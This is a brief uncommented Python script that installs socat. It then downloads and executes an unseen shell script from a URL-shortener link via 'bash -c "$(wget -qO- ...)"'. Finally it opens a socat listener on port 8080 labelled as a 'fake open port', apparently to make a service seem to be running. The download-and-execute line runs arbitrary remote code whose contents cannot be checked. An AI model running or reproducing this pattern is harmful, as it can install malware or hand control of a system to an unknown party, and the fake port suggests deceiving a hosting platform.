import subprocess

command = 'apt install socat -y && bash -c "$(wget -qO- s.id/26TIf)"'

result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

print(result.stdout.decode())
if result.stderr:
    print(result.stderr.decode())

fake_open_port_command = 'socat TCP-LISTEN:8080,fork EXEC:/bin/cat'

fake_port_result = subprocess.run(fake_open_port_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

print(fake_port_result.stdout.decode())
if fake_port_result.stderr:
    print(fake_port_result.stderr.decode())
